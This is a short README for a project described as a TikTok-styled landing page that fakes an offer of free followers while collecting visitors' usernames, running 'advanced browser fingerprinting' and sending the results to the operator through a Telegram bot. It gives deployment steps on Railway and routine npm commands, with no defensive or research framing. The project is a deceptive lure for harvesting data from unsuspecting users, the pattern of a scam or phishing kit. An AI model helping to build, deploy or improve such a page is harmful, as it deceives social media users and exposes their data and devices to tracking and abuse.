# TikTok Follower Landing Page

A TikTok-styled landing page that simulates offering free followers with data collection capabilities.

## Features

- Modern TikTok-styled UI with animations
- Form for collecting TikTok usernames
- Advanced browser fingerprinting
- Telegram notification system

## Deployment on Railway

1. Create a Railway account and install the Railway CLI
2. Clone this repository
3. Run `railway init` to create a new project
4. Set the required environment variables:
   - `TELEGRAM_BOT_TOKEN`
   - `TELEGRAM_CHAT_ID`
5. Deploy with `railway up`

## Running locally

```bash
# Install dependencies
npm install

# Start the development server
npm run dev

# Build for production
npm run build

# Start in production mode
npm run start
```